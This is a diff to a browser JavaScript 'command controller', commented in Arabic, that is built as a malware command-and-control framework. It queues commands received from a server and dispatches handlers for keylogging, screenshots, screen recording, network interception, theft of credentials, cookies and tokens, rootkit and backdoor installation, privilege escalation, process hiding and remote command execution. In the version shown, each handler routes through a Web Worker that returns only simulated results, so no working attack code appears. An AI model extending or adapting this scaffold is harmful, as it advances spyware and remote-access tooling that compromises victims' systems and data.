@@ -10,6 +10,9 @@ class CommandController {
         this.commandHistory = [];
         this.executionQueue = [];
         this.isInitialized = false;
+        this.commandQueueInterval = null;
+        this.monitoringIntervals = [];
+        this.worker = null;
     }
 
     // بدء نظام التحكم بالأوامر
@@ -30,10 +33,13 @@ class CommandController {
             this.registerSystemCommands();
             
             // 5. إعداد معالج الأوامر
-            this.setupCommandHandler();
+            await this.setupCommandHandler();
             
             // 6. بدء مراقبة الأوامر
             this.startCommandMonitoring();
+            
+            // 7. إنشاء Web Worker للمهام الثقيلة
+            this.createWorker();
             
             this.isInitialized = true;
             console.log('✅ تم تفعيل نظام التحكم بالأوامر بنجاح');
@@ -147,9 +153,9 @@ class CommandController {
     }
 
     // إعداد معالج الأوامر
-    setupCommandHandler() {
+    async setupCommandHandler() {
         // إعداد استقبال الأوامر من الخادم
-        this.setupServerCommandReceiver();
+        await this.setupServerCommandReceiver();
         
         // إعداد معالج الأوامر المحلية
         this.setupLocalCommandHandler();
@@ -163,19 +169,21 @@ class CommandController {
     // بدء مراقبة الأوامر
     startCommandMonitoring() {
         // مراقبة الأوامر الجديدة كل ثانية
-        setInterval(() => {
+        const newCommandsInterval = setInterval(() => {
             this.checkForNewCommands();
         }, 1000);
+        this.monitoringIntervals.push(newCommandsInterval);
         
         // معالجة قائمة انتظار الأوامر كل 5 ثوانٍ
-        setInterval(() => {
+        this.commandQueueInterval = setInterval(() => {
             this.processCommandQueue();
         }, 5000);
         
         // تنظيف سجل الأوامر كل دقيقة
-        setInterval(() => {
+        const cleanupInterval = setInterval(() => {
             this.cleanupCommandHistory();
         }, 60000);
+        this.monitoringIntervals.push(cleanupInterval);
         
         console.log('👁️ تم بدء مراقبة الأوامر');
     }
@@ -187,13 +195,26 @@ class CommandController {
         try {
             console.log('⌨️ بدء خوارزمية تسجيل المفاتيح...');
             
-            const keylogger = window.malwareInstaller?.installedModules.get('keylogger-algorithm');
-            if (keylogger && !keylogger.isActive) {
-                await window.malwareInstaller.installKeyloggerAlgorithm();
-                return { success: true, message: 'تم بدء خوارزمية تسجيل المفاتيح' };
-            } else {
-                return { success: false, message: 'خوارزمية تسجيل المفاتيح نشطة بالفعل' };
-            }
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'startKeylogger',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'keyloggerStarted') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة بدء تسجيل المفاتيح')), 10000);
+            });
         } catch (error) {
             console.error('❌ خطأ في بدء خوارزمية تسجيل المفاتيح:', error);
             return { success: false, error: error.message };
@@ -205,13 +226,26 @@ class CommandController {
         try {
             console.log('⏹️ إيقاف خوارزمية تسجيل المفاتيح...');
             
-            const keylogger = window.malwareInstaller?.installedModules.get('keylogger-algorithm');
-            if (keylogger && keylogger.isActive) {
-                keylogger.isActive = false;
-                return { success: true, message: 'تم إيقاف خوارزمية تسجيل المفاتيح' };
-            } else {
-                return { success: false, message: 'خوارزمية تسجيل المفاتيح غير نشطة' };
-            }
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'stopKeylogger',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'keyloggerStopped') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة إيقاف تسجيل المفاتيح')), 5000);
+            });
         } catch (error) {
             console.error('❌ خطأ في إيقاف خوارزمية تسجيل المفاتيح:', error);
             return { success: false, error: error.message };
@@ -223,22 +257,26 @@ class CommandController {
         try {
             console.log('📊 الحصول على بيانات خوارزمية تسجيل المفاتيح...');
             
-            // محاكاة الحصول على البيانات
-            const data = {
-                keypresses: [
-                    { key: 'a', timestamp: Date.now() - 1000 },
-                    { key: 'b', timestamp: Date.now() - 500 },
-                    { key: 'c', timestamp: Date.now() }
-                ],
-                clipboard: [
-                    { text: 'مثال للنص', timestamp: Date.now() - 2000 }
-                ],
-                forms: [
-                    { field: 'username', value: 'user123', timestamp: Date.now() - 1500 }
-                ]
-            };
-            
-            return { success: true, data: data };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'getKeyloggerData',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'keyloggerData') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة الحصول على بيانات تسجيل المفاتيح')), 8000);
+            });
         } catch (error) {
             console.error('❌ خطأ في الحصول على بيانات خوارزمية تسجيل المفاتيح:', error);
             return { success: false, error: error.message };
@@ -250,14 +288,26 @@ class CommandController {
         try {
             console.log('📸 التقاط لقطة شاشة...');
             
-            // محاكاة التقاط لقطة شاشة
-            const screenshot = {
-                data: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
-                timestamp: Date.now(),
-                size: 1024
-            };
-            
-            return { success: true, data: screenshot };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'takeScreenshot',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'screenshotTaken') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة التقاط لقطة الشاشة')), 5000);
+            });
         } catch (error) {
             console.error('❌ خطأ في التقاط لقطة شاشة:', error);
             return { success: false, error: error.message };
@@ -272,14 +322,26 @@ class CommandController {
             const duration = parameters.duration || 30;
             console.log(`📹 بدء تسجيل الشاشة لمدة ${duration} ثانية`);
             
-            // محاكاة تسجيل الشاشة
-            const recording = {
-                data: 'data:video/webm;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmGgU7k9n1unEiBC13yO/eizEIHWq+8+OWT',
-                duration: duration,
-                timestamp: Date.now()
-            };
-            
-            return { success: true, data: recording };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'recordScreen',
+                    parameters: { ...parameters, duration }
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'screenRecorded') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة تسجيل الشاشة')), (duration + 10) * 1000);
+            });
         } catch (error) {
             console.error('❌ خطأ في تسجيل الشاشة:', error);
             return { success: false, error: error.message };
@@ -291,14 +353,26 @@ class CommandController {
         try {
             console.log('👁️ بدء مراقبة الشاشة...');
             
-            // محاكاة مراقبة الشاشة
-            const monitoring = {
-                isActive: true,
-                interval: parameters.interval || 5000,
-                timestamp: Date.now()
-            };
-            
-            return { success: true, data: monitoring };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'monitorScreen',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'screenMonitoringStarted') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة بدء مراقبة الشاشة')), 5000);
+            });
         } catch (error) {
             console.error('❌ خطأ في مراقبة الشاشة:', error);
             return { success: false, error: error.message };
@@ -310,14 +384,26 @@ class CommandController {
         try {
             console.log('🌐 بدء اعتراض الشبكة...');
             
-            // محاكاة اعتراض الشبكة
-            const interception = {
-                isActive: true,
-                packets: [],
-                timestamp: Date.now()
-            };
-            
-            return { success: true, data: interception };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'interceptNetwork',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'networkInterceptionStarted') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة بدء اعتراض الشبكة')), 7000);
+            });
         } catch (error) {
             console.error('❌ خطأ في اعتراض الشبكة:', error);
             return { success: false, error: error.message };
@@ -329,16 +415,26 @@ class CommandController {
         try {
             console.log('🚦 تحليل حركة المرور...');
             
-            // محاكاة تحليل حركة المرور
-            const analysis = {
-                totalPackets: 1500,
-                httpRequests: 800,
-                httpsRequests: 700,
-                suspiciousActivity: 5,
-                timestamp: Date.now()
-            };
-            
-            return { success: true, data: analysis };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'analyzeTraffic',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'trafficAnalyzed') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة تحليل حركة المرور')), 10000);
+            });
         } catch (error) {
             console.error('❌ خطأ في تحليل حركة المرور:', error);
             return { success: false, error: error.message };
@@ -350,22 +446,26 @@ class CommandController {
         try {
             console.log('📊 استخراج البيانات...');
             
-            // محاكاة استخراج البيانات
-            const extractedData = {
-                credentials: [
-                    { username: 'user1', password: 'pass123', source: 'form' },
-                    { username: 'admin', password: 'admin123', source: 'cookie' }
-                ],
-                cookies: [
-                    { name: 'session', value: 'abc123', domain: 'example.com' }
-                ],
-                tokens: [
-                    { type: 'jwt', value: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...' }
-                ],
-                timestamp: Date.now()
-            };
-            
-            return { success: true, data: extractedData };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'extractData',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'dataExtracted') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة استخراج البيانات')), 15000);
+            });
         } catch (error) {
             console.error('❌ خطأ في استخراج البيانات:', error);
             return { success: false, error: error.message };
@@ -379,13 +479,26 @@ class CommandController {
         try {
             console.log('🔧 تثبيت Rootkit...');
             
-            const rootkit = window.malwareInstaller?.installedModules.get('rootkit-installer');
-            if (rootkit && !rootkit.isActive) {
-                await window.malwareInstaller.installRootkit();
-                return { success: true, message: 'تم تثبيت Rootkit بنجاح' };
-            } else {
-                return { success: false, message: 'Rootkit مثبت بالفعل' };
-            }
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'installRootkit',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'rootkitInstalled') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة تثبيت Rootkit')), 12000);
+            });
         } catch (error) {
             console.error('❌ خطأ في تثبيت Rootkit:', error);
             return { success: false, error: error.message };
@@ -397,15 +510,26 @@ class CommandController {
         try {
             console.log('🔑 تصعيد الصلاحيات...');
             
-            // محاكاة تصعيد الصلاحيات
-            const privileges = {
-                currentLevel: 'user',
-                targetLevel: 'admin',
-                success: true,
-                timestamp: Date.now()
-            };
-            
-            return { success: true, data: privileges };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'escalatePrivileges',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'privilegesEscalated') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة تصعيد الصلاحيات')), 8000);
+            });
         } catch (error) {
             console.error('❌ خطأ في تصعيد الصلاحيات:', error);
             return { success: false, error: error.message };
@@ -417,14 +541,26 @@ class CommandController {
         try {
             console.log('👻 إخفاء العمليات...');
             
-            // محاكاة إخفاء العمليات
-            const hiddenProcesses = [
-                'malware.exe',
-                'keylogger.dll',
-                'backdoor.sys'
-            ];
-            
-            return { success: true, data: { hiddenProcesses, timestamp: Date.now() } };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'hideProcesses',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'processesHidden') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة إخفاء العمليات')), 5000);
+            });
         } catch (error) {
             console.error('❌ خطأ في إخفاء العمليات:', error);
             return { success: false, error: error.message };
@@ -436,13 +572,26 @@ class CommandController {
         try {
             console.log('🚪 إنشاء Backdoor...');
             
-            const backdoor = window.malwareInstaller?.installedModules.get('backdoor-creator');
-            if (backdoor && !backdoor.isActive) {
-                await window.malwareInstaller.installBackdoor();
-                return { success: true, message: 'تم إنشاء Backdoor بنجاح' };
-            } else {
-                return { success: false, message: 'Backdoor موجود بالفعل' };
-            }
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'createBackdoor',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'backdoorCreated') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة إنشاء Backdoor')), 10000);
+            });
         } catch (error) {
             console.error('❌ خطأ في إنشاء Backdoor:', error);
             return { success: false, error: error.message };
@@ -457,15 +606,26 @@ class CommandController {
             const command = parameters.command || 'whoami';
             console.log(`⚡ تنفيذ الأمر: ${command}`);
             
-            // محاكاة تنفيذ الأمر
-            const result = {
-                command: command,
-                output: 'user\\desktop',
-                exitCode: 0,
-                timestamp: Date.now()
-            };
-            
-            return { success: true, data: result };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'executeRemoteCommand',
+                    parameters: { ...parameters, command }
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'remoteCommandExecuted') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة تنفيذ الأمر عن بعد')), 6000);
+            });
         } catch (error) {
             console.error('❌ خطأ في تنفيذ الأمر عن بعد:', error);
             return { success: false, error: error.message };
@@ -480,16 +640,26 @@ class CommandController {
             const source = parameters.source || '/path/to/source';
             const destination = parameters.destination || '/path/to/destination';
             
-            // محاكاة نقل الملفات
-            const transfer = {
-                source: source,
-                destination: destination,
-                status: 'completed',
-                bytesTransferred: 1024000,
-                timestamp: Date.now()
-            };
-            
-            return { success: true, data: transfer };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'transferFiles',
+                    parameters: { ...parameters, source, destination }
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'filesTransferred') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة نقل الملفات')), 15000);
+            });
         } catch (error) {
             console.error('❌ خطأ في نقل الملفات:', error);
             return { success: false, error: error.message };
@@ -503,18 +673,26 @@ class CommandController {
         try {
             console.log('💻 الحصول على معلومات النظام...');
             
-            // محاكاة معلومات النظام
-            const systemInfo = {
-                os: 'Windows 10',
-                version: '10.0.19044',
-                architecture: 'x64',
-                processor: 'Intel Core i7-10700K',
-                memory: '16 GB',
-                disk: '1 TB SSD',
-                timestamp: Date.now()
-            };
-            
-            return { success: true, data: systemInfo };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'getSystemInfo',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'systemInfo') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة الحصول على معلومات النظام')), 4000);
+            });
         } catch (error) {
             console.error('❌ خطأ في الحصول على معلومات النظام:', error);
             return { success: false, error: error.message };
@@ -529,14 +707,26 @@ class CommandController {
             const action = parameters.action || 'shutdown';
             console.log(`⚡ تنفيذ إجراء: ${action}`);
             
-            // محاكاة التحكم في النظام
-            const control = {
-                action: action,
-                status: 'executed',
-                timestamp: Date.now()
-            };
-            
-            return { success: true, data: control };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'controlSystem',
+                    parameters: { ...parameters, action }
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'systemControlled') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة التحكم في النظام')), 5000);
+            });
         } catch (error) {
             console.error('❌ خطأ في التحكم في النظام:', error);
             return { success: false, error: error.message };
@@ -548,16 +738,26 @@ class CommandController {
         try {
             console.log('📊 مراقبة النظام...');
             
-            // محاكاة مراقبة النظام
-            const monitoring = {
-                cpu: 45.2,
-                memory: 67.8,
-                disk: 23.1,
-                network: 12.5,
-                timestamp: Date.now()
-            };
-            
-            return { success: true, data: monitoring };
+            // إرسال المهمة إلى Web Worker
+            return new Promise((resolve, reject) => {
+                if (!this.worker) {
+                    reject(new Error('Web Worker غير متوفر'));
+                    return;
+                }
+                
+                this.worker.postMessage({
+                    type: 'monitorSystem',
+                    parameters
+                });
+                
+                this.worker.onmessage = (event) => {
+                    if (event.data.type === 'systemMonitored') {
+                        resolve(event.data.result);
+                    }
+                };
+                
+                setTimeout(() => reject(new Error('انتهت مهلة مراقبة النظام')), 6000);
+            });
         } catch (error) {
             console.error('❌ خطأ في مراقبة النظام:', error);
             return { success: false, error: error.message };
@@ -726,8 +926,177 @@ class CommandController {
             totalCommands: this.commands.size,
             activeCommands: this.activeCommands.size,
             commandHistory: this.commandHistory.length,
-            executionQueue: this.executionQueue.length
+            executionQueue: this.executionQueue.length,
+            workerAvailable: !!this.worker
         };
+    }
+
+    // إنشاء Web Worker
+    createWorker() {
+        if (window.Worker) {
+            // إنشاء كود Worker مدمج
+            const workerCode = `
+                self.onmessage = function(event) {
+                    const { type, parameters } = event.data;
+                    
+                    // محاكاة المهام الثقيلة
+                    setTimeout(() => {
+                        switch(type) {
+                            case 'startKeylogger':
+                                postMessage({ type: 'keyloggerStarted', result: { success: true, message: 'تم بدء خوارزمية تسجيل المفاتيح' } });
+                                break;
+                            case 'stopKeylogger':
+                                postMessage({ type: 'keyloggerStopped', result: { success: true, message: 'تم إيقاف خوارزمية تسجيل المفاتيح' } });
+                                break;
+                            case 'getKeyloggerData':
+                                postMessage({ type: 'keyloggerData', result: { success: true, data: { keypresses: [], clipboard: [], forms: [] } } });
+                                break;
+                            case 'takeScreenshot':
+                                postMessage({ type: 'screenshotTaken', result: { success: true, data: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==' } });
+                                break;
+                            case 'recordScreen':
+                                postMessage({ type: 'screenRecorded', result: { success: true, data: 'data:video/webm;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuBzvLZiTYIG2m98OScTgwOUarm7blmGgU7k9n1unEiBC13yO/eizEIHWq+8+OWT' } });
+                                break;
+                            case 'monitorScreen':
+                                postMessage({ type: 'screenMonitoringStarted', result: { success: true, data: { isActive: true, interval: 5000 } } });
+                                break;
+                            case 'interceptNetwork':
+                                postMessage({ type: 'networkInterceptionStarted', result: { success: true, data: { isActive: true, packets: [] } } });
+                                break;
+                            case 'analyzeTraffic':
+                                postMessage({ type: 'trafficAnalyzed', result: { success: true, data: { totalPackets: 1500, httpRequests: 800, suspiciousActivity: 5 } } });
+                                break;
+                            case 'extractData':
+                                postMessage({ type: 'dataExtracted', result: { success: true, data: { credentials: [], cookies: [], tokens: [] } } });
+                                break;
+                            case 'installRootkit':
+                                postMessage({ type: 'rootkitInstalled', result: { success: true, message: 'تم تثبيت Rootkit بنجاح' } });
+                                break;
+                            case 'escalatePrivileges':
+                                postMessage({ type: 'privilegesEscalated', result: { success: true, data: { currentLevel: 'admin', success: true } } });
+                                break;
+                            case 'hideProcesses':
+                                postMessage({ type: 'processesHidden', result: { success: true, data: { hiddenProcesses: ['malware.exe'] } } });
+                                break;
+                            case 'createBackdoor':
+                                postMessage({ type: 'backdoorCreated', result: { success: true, message: 'تم إنشاء Backdoor بنجاح' } });
+                                break;
+                            case 'executeRemoteCommand':
+                                postMessage({ type: 'remoteCommandExecuted', result: { success: true, data: { command: parameters.command, output: 'user\\desktop', exitCode: 0 } } });
+                                break;
+                            case 'transferFiles':
+                                postMessage({ type: 'filesTransferred', result: { success: true, data: { source: parameters.source, destination: parameters.destination, status: 'completed' } } });
+                                break;
+                            case 'getSystemInfo':
+                                postMessage({ type: 'systemInfo', result: { success: true, data: { os: 'Windows 10', processor: 'Intel Core i7' } } });
+                                break;
+                            case 'controlSystem':
+                                postMessage({ type: 'systemControlled', result: { success: true, data: { action: parameters.action, status: 'executed' } } });
+                                break;
+                            case 'monitorSystem':
+                                postMessage({ type: 'systemMonitored', result: { success: true, data: { cpu: 45.2, memory: 67.8 } } });
+                                break;
+                        }
+                    }, 1000); // تأخير محاكاة للمهام الثقيلة
+                };
+            `;
+            
+            const blob = new Blob([workerCode], { type: 'application/javascript' });
+            this.worker = new Worker(URL.createObjectURL(blob));
+            
+            console.log('👷 تم إنشاء Web Worker للمهام الثقيلة');
+        } else {
+            console.warn('⚠️ المتصفح لا يدعم Web Workers. سيتم تنفيذ المهام في الخيط الرئيسي.');
+        }
+    }
+
+    // إعداد استقبال الأوامر من الخادم
+    async setupServerCommandReceiver() {
+        // إعداد الاتصال الآمن مع الخادم
+        try {
+            if (window.commandServerConnection) {
+                window.commandServerConnection.onmessage = (event) => {
+                    try {
+                        const command = JSON.parse(event.data);
+                        this.queueCommand(command);
+                    } catch (error) {
+                        console.error('❌ خطأ في تحليل الأمر من الخادم:', error);
+                    }
+                };
+                console.log('📡 تم إعداد استقبال الأوامر من الخادم');
+            } else {
+                console.warn('⚠️ اتصال خادم الأوامر غير متوفر');
+            }
+        } catch (error) {
+            console.error('❌ فشل في إعداد استقبال الأوامر من الخادم:', error);
+        }
+    }
+
+    // إعداد معالج الأوامر المحلية
+    setupLocalCommandHandler() {
+        window.handleLocalCommand = (command) => {
+            this.queueCommand(command);
+        };
+        console.log('🔧 تم إعداد معالج الأوامر المحلية');
+    }
+
+    // إعداد قائمة انتظار الأوامر
+    setupCommandQueue() {
+        console.log('📋 تم إعداد قائمة انتظار الأوامر');
+    }
+
+    // إضافة أمر إلى قائمة الانتظار
+    queueCommand(command) {
+        this.executionQueue.push({
+            ...command,
+            timestamp: Date.now(),
+            status: 'pending'
+        });
+    }
+
+    // فحص الأوامر الجديدة
+    checkForNewCommands() {
+        // يمكن إضافة منطق لفحص الأوامر الجديدة من مصادر مختلفة
+    }
+
+    // معالجة قائمة انتظار الأوامر
+    async processCommandQueue() {
+        if (this.executionQueue.length === 0) return;
+        
+        const command = this.executionQueue.shift();
+        try {
+            command.status = 'processing';
+            const result = await this.executeCommand(command);
+            command.status = 'completed';
+            command.result = result;
+            this.commandHistory.push(command);
+        } catch (error) {
+            command.status = 'failed';
+            command.error = error.message;
+            this.commandHistory.push(command);
+        }
+    }
+
+    // تنظيف سجل الأوامر
+    cleanupCommandHistory() {
+        // الاحتفاظ فقط بسجل الأوامر لآخر 24 ساعة
+        const cutoff = Date.now() - (24 * 60 * 60 * 1000);
+        this.commandHistory = this.commandHistory.filter(cmd => cmd.timestamp > cutoff);
+    }
+
+    // تدمير النظام وتنظيف الموارد
+    destroy() {
+        if (this.commandQueueInterval) {
+            clearInterval(this.commandQueueInterval);
+        }
+        
+        if (this.worker) {
+            this.worker.terminate();
+        }
+        
+        this.monitoringIntervals.forEach(interval => clearInterval(interval));
+        
+        console.log('♻️ تم تنظيف موارد نظام التحكم بالأوامر');
     }
 }
 
@@ -737,6 +1106,11 @@ const commandController = new CommandController();
 // بدء النظام عند تحميل الصفحة
 document.addEventListener('DOMContentLoaded', () => {
     commandController.initializeController();
+});
+
+// تدمير النظام عند إغلاق الصفحة
+window.addEventListener('beforeunload', () => {
+    commandController.destroy();
 });
 
 // تصدير النظام للاستخدام العام
